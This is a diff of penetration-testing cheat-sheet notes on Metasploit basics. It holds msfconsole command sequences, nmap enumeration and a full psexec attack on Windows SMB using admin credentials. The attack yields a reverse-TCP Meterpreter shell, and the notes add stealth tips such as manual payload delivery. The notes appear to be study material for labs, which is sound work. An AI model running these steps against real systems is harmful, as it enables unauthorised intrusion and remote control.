@@ -1,85 +1,37 @@
-## Initial Target Enumeration
+# Automating Payloads — Metasploit Basics
 
-Target OS and service versions are unknown, requiring identification to map vulnerabilities to specific framework modules.
-
-Initial enumeration to identify services like SMB on **445** or RPC on **135**
-
-```
-nmap -sC -sV -Pn <TARGET_IP>
-```
-
-- **SMB Message signing disabled** on the target is a **dangerous** default state that facilitates easier exploitation.
-
-## Module Discovery and Navigation
-
-Services are identified and require a searchable database to find relevant exploit, auxiliary, or post-exploitation modules.
-
-Launch the framework console with root privileges
+Search for modules by service/vuln, select by number, check options, set required fields, run:
 
 ```
 sudo msfconsole
+msf6 > search smb
+msf6 > use <NUMBER>
+msf6 exploit(...) > options
+msf6 exploit(...) > set RHOSTS <TARGET>
+msf6 exploit(...) > set LHOST <LHOST>
+msf6 exploit(...) > exploit
 ```
 
-Find modules associated with a specific service or vulnerability
+psexec module — needs valid admin creds, uploads a randomly-named service to ADMIN$, lands Meterpreter:
 
 ```
-search <SERVICE_NAME>
-```
-
-Select a module by its full path or the index number from the latest search results
-
-```
-use <MODULE_PATH>
-```
-
-Refresh the framework database after modifying custom modules
-
-```
-reload
-```
-
-- **Search index numbers are volatile** and will change as the maintainers update the codebase or when custom modules are imported.
-
-## Exploit Configuration and Execution
-
-A module is selected and requires environment-specific parameters before delivery.
-
-Display all required and optional parameters for the current module and payload
-
-```
-options
-```
-
-Configure necessary variables such as **RHOSTS**, **LHOST**, and credentials
-
-```
-set <VARIABLE> <VALUE>
-```
-
-Launch the exploit and initiate the payload delivery sequence
-
-```
+use exploit/windows/smb/psexec
+set RHOSTS <TARGET>
+set SHARE ADMIN$
+set SMBUser <USER>
+set SMBPass <PASS>
+set LHOST <LHOST>
 exploit
 ```
 
-- **LHOST** can be set to a specific IP or a local interface ID like `tun0`.
-- **Service start timeout** may trigger a warning during execution but is not a **failure condition** if running a command or non-service executable.
+Default payload is `windows/meterpreter/reverse_tcp` on port 4444 — change LPORT if needed.
 
-## Post-Exploitation Interaction
-
-A session is established and requires interaction for file management, process manipulation, or native command execution.
-
-View all available Meterpreter commands for the current session
+Drop from Meterpreter to a full system shell when you need native OS commands:
 
 ```
-?
+meterpreter > shell
 ```
 
-Drop from the Meterpreter agent into a native system-level shell to use target-native commands
+> [!tip] `set LHOST` accepts an interface name (e.g. `tun0`) instead of an IP — useful when your VPN IP changes between sessions.
 
-```
-shell
-```
-
-- **Meterpreter** functions via **in-memory DLL injection** to avoid writing to disk and maintain stealth.
-- **Restricted command sets** in Meterpreter may necessitate dropping to a native shell to access the full suite of system-native binaries.
+> [!warning] psexec writes a service binary to ADMIN$ — requires writable admin share and valid admin creds. Noisy. Leaves artifacts even though MSF attempts cleanup. Prefer `exploit/multi/handler` + manual payload delivery for stealth.
